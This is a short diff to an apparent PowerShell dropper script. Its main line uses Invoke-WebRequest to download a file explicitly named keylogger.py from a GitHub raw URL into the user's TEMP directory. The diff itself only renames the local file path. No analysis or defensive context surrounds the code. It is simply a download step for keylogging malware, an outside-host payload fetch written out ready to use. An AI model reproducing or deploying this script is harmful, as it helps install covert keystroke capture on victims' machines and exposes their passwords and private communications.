@@ -1,6 +1,6 @@
 # Set download URL and path
 $downloadUrl = "https://raw.githubusercontent.com/ndnik/ndnik/refs/heads/main/keylogger.py%202"
-$tempPath = "$env:TEMP\keylogger.py"
+$tempPath = "$env:TEMP\keylogger.py 2"
 
 # Download the keylogger.py
 Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing
